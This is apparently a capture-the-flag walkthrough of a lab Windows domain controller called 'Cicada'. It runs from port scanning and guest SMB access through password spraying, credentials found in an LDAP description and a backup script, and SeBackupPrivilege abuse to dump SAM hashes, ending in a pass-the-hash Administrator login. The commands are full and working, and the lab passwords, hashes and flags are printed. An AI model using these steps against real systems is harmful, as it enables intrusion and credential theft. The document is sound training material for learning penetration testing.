# Cicada Walkthrough

## Recon

### nmap
First, I will do nmap to find any open ports

#### nmap -p- --min-rate 10000 10.129.34.19

PORT      STATE SERVICE  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
59245/tcp open  unknown  


#### nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,59245 -sCV 10.129.34.19

PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 09:24:30Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-05-01T09:25:59+00:00; +7h00m00s from scanner time.  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-05-01T09:26:00+00:00; +7h00m00s from scanner time.  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-05-01T09:25:59+00:00; +7h00m00s from scanner time.  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-05-01T09:26:00+00:00; +7h00m00s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
59245/tcp open  msrpc         Microsoft Windows RPC  
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:   
|   date: 2026-05-01T09:25:22  
|_  start_date: N/A  
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s  
| smb2-security-mode:   
|   3.1.1:   
|_    Message signing enabled and required  

#### echo '10.129.34.19 CICADA-DC cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts

The domain cicada.htb shows up on many ports and the hostname CICADA-DC as well. That is how I add those to /etc/hosts above.

RPC with port 135  
NetBios with port 139
SMB with port 445
=> They are common on all Window machines

DNS with port 53, Kerberos with port 88, and LDAP with port 389,636,3268,3269 are common for Domain Controllers.

### SMB
#### netexec smb CICADA-DC

SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  

The box is running on Window Server 2022.

Now I tried

#### netexec smb CICADA-DC --shares  
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED  

Clearly it is not working so I tried with user guest and emptry password

#### netexec smb CICADA-DC -u guest -p '' --shares
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\guest:   
SMB         10.129.34.19    445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.34.19    445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.34.19    445    CICADA-DC        -----           -----------     ------  
SMB         10.129.34.19    445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.34.19    445    CICADA-DC        C$                              Default share  
SMB         10.129.34.19    445    CICADA-DC        DEV                               
SMB         10.129.34.19    445    CICADA-DC        HR              READ              
SMB         10.129.34.19    445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.34.19    445    CICADA-DC        NETLOGON                        Logon server share   
SMB         10.129.34.19    445    CICADA-DC        SYSVOL                          Logon server share   

=> It works

So ADMIN$, C$, and IPC$ are standard on any Windows host, and the first two ADMIN$ and C$ require admin access and IPC$ doesn’t offer much of interest. NETLOGON and SYSVOL are standard on a DC. DEV and HR are specific to Cicada.

So the guest account has access to the HR share. I connect with smb client  
#### smbclient -N //10.129.34.19/HR

Try "help" to get a list of possible commands.  
smb: \> ls  
  .                                   D        0  Thu Mar 14 08:29:09 2024  
  ..                                  D        0  Thu Mar 14 08:21:29 2024  
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024  

There is single file where I can grab them by "get "Notice from HR.txt""

The another terminal in the same folder I do cat "Notice from HR.txt" 

I saw some interesting the password 
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default   password to something unique and secure.  
  
Your default password is: Cicada$M6Corpb*@Lp#nZp!8  

### Rid Cycling 
I brute force users from 0 to 4000

#### netexec smb CICADA-DC -u guest -p '' --rid-brute

I will shorten the user list by using grep

#### netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
Administrator  
Guest  
krbtgt  
CICADA-DC$  
john.smoulder  
sarah.dantelia  
michael.wrightson  
david.orelious  
emily.oscars  

### Auth as michael.wrightson
Let's try to find users associate with that password

#### netexec smb CICADA-DC -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success


SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.34.19    445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  

=> So the user associates with that password is michael

Let's see if we have access

#### netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'

LDAP        10.129.34.19    389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel   binding:Never)  
LDAP        10.129.34.19    389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  
=> So the cred is valid

But checking with winrm it is not working 
#### netexec winrm CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
WINRM       10.129.34.19    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.  ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.34.19    5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  

### Auth as david.orelious
michael.wrightson doesn’t have any additional share access beyond what the guest user has:

#### netexec smb CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  
SMB         10.129.34.19    445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.34.19    445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.34.19    445    CICADA-DC        -----           -----------     ------  
SMB         10.129.34.19    445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.34.19    445    CICADA-DC        C$                              Default share  
SMB         10.129.34.19    445    CICADA-DC        DEV                               
SMB         10.129.34.19    445    CICADA-DC        HR              READ              
SMB         10.129.34.19    445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.34.19    445    CICADA-DC        NETLOGON        READ            Logon server share   
SMB         10.129.34.19    445    CICADA-DC        SYSVOL          READ            Logon server share  

Users

#### netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
LDAP        10.129.34.19    389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel   binding:Never)  
LDAP        10.129.34.19    389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  
LDAP        10.129.34.19    389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb  
LDAP        10.129.34.19    389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-    -Description-                                                                                      
LDAP        10.129.34.19    389    CICADA-DC        Administrator                 2024-08-26 16:08:03 1        Built-in account for administering the   computer/domain                                             
LDAP        10.129.34.19    389    CICADA-DC        Guest                         2024-08-28 13:26:56 0        Built-in account for guest access to   the computer/domain                                           
LDAP        10.129.34.19    389    CICADA-DC        krbtgt                        2024-03-14 07:14:10 1        Key Distribution Center Service   Account                                                            
LDAP        10.129.34.19    389    CICADA-DC        john.smoulder                 2024-03-14 08:17:29 1   
LDAP        10.129.34.19    389    CICADA-DC        sarah.dantelia                2024-03-14 08:17:29 1   
LDAP        10.129.34.19    389    CICADA-DC        michael.wrightson             2024-03-14 08:17:29 0   
LDAP        10.129.34.19    389    CICADA-DC        david.orelious                2024-03-14 08:17:29 1        Just in case I forget my password is   aRt$Lp#7t*VQ!3                                                
LDAP        10.129.34.19    389    CICADA-DC        emily.oscars                  2024-08-22 17:20:17 1   

Then I do for other users

#### netexec ldap CICADA-DC -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
With david i see

LDAP        10.129.34.19    389    CICADA-DC        david.orelious                2024-03-14 08:17:29 1        Just in case I forget my password is  aRt$Lp#7t*VQ!3    

Let's validate the cred 

#### netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3   
  
#### netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'  
LDAP        10.129.34.19    389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel   binding:Never)  
LDAP        10.129.34.19    389    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3  
  
#### netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'  
WINRM       10.129.34.19    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.  ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.34.19    5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3  

So it for smb and ldap but not on winrm

## Shell as emily.oscar

Let's do same step when I do michael

#### netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3   
SMB         10.129.34.19    445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.34.19    445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.34.19    445    CICADA-DC        -----           -----------     ------  
SMB         10.129.34.19    445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.34.19    445    CICADA-DC        C$                              Default share  
SMB         10.129.34.19    445    CICADA-DC        DEV             READ              
SMB         10.129.34.19    445    CICADA-DC        HR              READ              
SMB         10.129.34.19    445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.34.19    445    CICADA-DC        NETLOGON        READ            Logon server share   
SMB         10.129.34.19    445    CICADA-DC        SYSVOL          READ            Logon server share   

So david.orelious can see the same share but now it can read the DEV share

Let's use smbclient

#### smbclient -U david.orelious //CICADA-DC/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'

smb: \> ls  
  .                                   D        0  Thu Mar 14 08:31:39 2024  
  ..                                  D        0  Thu Mar 14 08:21:29 2024  
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024  


let's get smb: \> get Backup_script.ps1   
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (5.0 KiloBytes/sec) (average 5.0 KiloBytes/sec)  

cat Backup_script.ps1   



=> $username = "emily.oscars"
=> $password = .... "Q!3@Lp#M6b*7t*Vt"

2 things are interested


Let's validate the cred

#### netexec smb CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt   
                                                                                                          
#### netexec winrm CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'   
WINRM       10.129.34.19    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.  ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.34.19    5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt   (Pwn3d!)                                                                              

So it is work for smb and winrm

Then I log in winrm

#### evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

=> *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami  
cicada\emily.oscars  

So user flag is 

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt  
bc32bf8e83e10ffdc32b095a5bb108bd  

### Shell as system 

So I check and found emily is in the Backup Operators group
#### net user emily.oscars

This shows up in the form of the SeBackupPrivilege and SeRestorePrivilege with whoami /priv

### Exploit SeBackupPrivilege via reg / secretsdump

Then I do in evil winrm
reg save hklm\sam sam
reg save hklm\system system
 
# Download the files (takes a bit)
download sam
download system

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam  
The operation completed successfully.  
  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system  
The operation completed successfully.  
  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam  
                                          
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam  
                                          
Info: Download successful!  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system  
                                          
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system  
                                          
Info: Download successful!  

Then I do 
#### impacket-secretsdump -sam sam -system system LOCAL

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[*] Cleaning up...   


Let's validate administrator
#### netexec smb CICADA-DC -u administrator -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
SMB         10.129.34.19    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.34.19    445    CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)  

Nice it is working

Let's login with evil winrm to find the root flag

#### evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
465e599069b010a0575dcb2c89a6a8ed  

Whola I got the flag





